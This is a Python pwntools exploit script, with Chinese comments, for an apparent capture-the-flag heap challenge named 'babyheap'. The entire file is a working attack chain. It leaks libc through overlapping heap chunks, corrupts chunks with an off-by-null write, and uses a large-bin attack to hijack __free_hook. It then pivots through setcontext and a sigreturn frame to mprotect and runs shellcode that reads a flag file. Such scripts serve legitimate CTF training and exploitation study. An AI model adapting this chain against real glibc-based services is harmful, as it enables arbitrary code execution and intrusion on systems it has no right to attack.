#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

sh = process('./babyheap')
# sh = remote('123.206.174.203', 20001)
elf = ELF('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#context.log_level = "debug"
context.arch = "amd64"

# 创建pid文件，用于gdb调试
try:
    f = open('pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()
except Exception as e:
    print(e)

def add(size):
    sh.sendline('1')
    sh.recvuntil('Size: ')
    sh.sendline(str(size))
    sh.recv()

def edit(index, content):
    sh.sendline('2')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    sh.recvuntil('Content: ')
    sh.send(content)
    sh.recvuntil('Choice: \n')

def delete(index):
    sh.sendline('3')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    sh.recvuntil('Choice: \n')

def show(index):
    sh.sendline('4')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    result = sh.recvuntil('\n')
    sh.recvuntil('Choice: \n')
    return result[:-1]

# 清除流
sh.recvuntil('Choice: \n')

# chunk extend
add(0x80) # index 0
add(0x68) # index 1
add(0xf8) # index 2
add(24) # index 3

delete(0)
edit(1,'a' * 0x60 + p64(0x100)) # set prev_size
# pause()
delete(2)

# 泄露基地址
add(0x80) # index 0
add(0x80) # index 2
delete(2)
result = show(1) 
main_arena_88_addr = u64(result.ljust(8, '\0'))
log.success("main_arena_88_addr: " + hex(main_arena_88_addr))

main_arena_addr = main_arena_88_addr - 88
log.success("main_arena_addr: " + hex(main_arena_addr))

main_arena_offset = 0x3c4b20 # 自己计算
# main_arena_offset = 0x389b20
libc_addr = main_arena_addr - main_arena_offset
log.success("libc_addr: " + hex(libc_addr))

system_addr = libc_addr + libc.symbols['system']
log.success("system_addr: " + hex(system_addr))

add(0x160) # index 2

# 劫持 free_hook
add(0x18)  # 4
add(0x508)  # 5
add(0x18)  # 6
add(0x18)  # 7
add(0x508)  # 8
add(0x18)  # 9
add(0x18)  # 10

# 改pre_size域为 0x500 ,为了能过检查
edit(5, 'a'*0x4f0 + p64(0x500))
# 释放5号块到unsort bin 此时chunk size=0x510
# 6号的prev_size 为 0x510
delete(5)

# off by null 将5号块的size字段覆盖为0x500，
# 和上面的0x500对应，为了绕过检查
edit(4, 'a'*(0x18))

add(0x18)  # 5  从unsorted bin上面割下来的
add(0x4d8)  # 11 为了和 5 重叠

delete(5)
delete(6)  # unlink进行前向extend

# 6号块与11号块交叠，可以通过11号块修改6号块的内容
add(0x30)  # 5
add(0x4e8)  # 6

# 原理同上
edit(8, 'a'*(0x4f0) + p64(0x500))
delete(8)
edit(7, 'a'*(0x18))
add(0x18)  # 8
add(0x4d8)  # 12
delete(8)
delete(9)
add(0x40)  # 8

# 将6号块和8号块分别加入unsort bin和large bin
delete(6)
#pause()
add(0x4e8)    # 6
delete(6)
#pause()


__free_hook_offset = 0x3c67a8
__free_hook_addr =  libc_addr + __free_hook_offset # main_arena_addr - 16

storage = __free_hook_addr
fake_chunk = storage - 0x20

# 伪造fake_chunk
layout = [
    '\x00' * 16,  # 填充16个没必要的字节
    p64(0),  # fake_chunk->prev_size
    p64(0x4f1),  # fake_chunk->size
    p64(0),  # fake_chunk->fd
    p64(fake_chunk)  # fake_chunk->bk
]

# 修改unsorted bin 中的内容
edit(11, flat(layout))

layout = [
    '\x00' * 32,  # 32 字节偏移
    p64(0),  # fake_chunk2->prev_size
    p64(0x4e1),  # fake_chunk2->size
    p64(0),  # fake_chunk2->fd
    # 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃
    p64(fake_chunk + 8),  # fake_chunk2->bk
    p64(0),  # fake_chunk2->fd_nextsize
    # 用于使用错误对齐技巧创建假块的“大小”
    p64(fake_chunk - 0x18 - 5)  # fake_chunk2->bk_nextsize
]

# 修改large bin 中的内容
edit(12, flat(layout))

#pause()

add(0x48)  # 6

new_execve_env = __free_hook_addr & 0xfffffffffffff000
print hex(__free_hook_addr)
print hex(new_execve_env)
shellcode1 = '''
xor rdi, rdi
mov rsi, %d
mov edx, 0x1000

mov eax, 0
syscall

jmp rsi
''' %new_execve_env

edit(6, 'a' * 0x10 + p64(libc_addr + libc.symbols['setcontext'] + 53) + p64(__free_hook_addr + 0x10) + asm(shellcode1))

 #pause()

# 指定机器的运行模式
context.arch = "amd64"
# 设置寄存器
frame = SigreturnFrame()
frame.rsp = __free_hook_addr + 8
frame.rip = libc_addr + libc.symbols['mprotect'] # 0xa8 rcx
frame.rdi = new_execve_env
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1

edit(12, str(frame))
sh.sendline('3')
sh.recvuntil('Index: ')
sh.sendline('12')

shellcode2 = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;// 置0就行
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;// 读到栈上
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''

sh.send(asm(shellcode2))

#print(sh.recv())

sh.interactive()

# 删除pid文件
os.system("rm -f pid")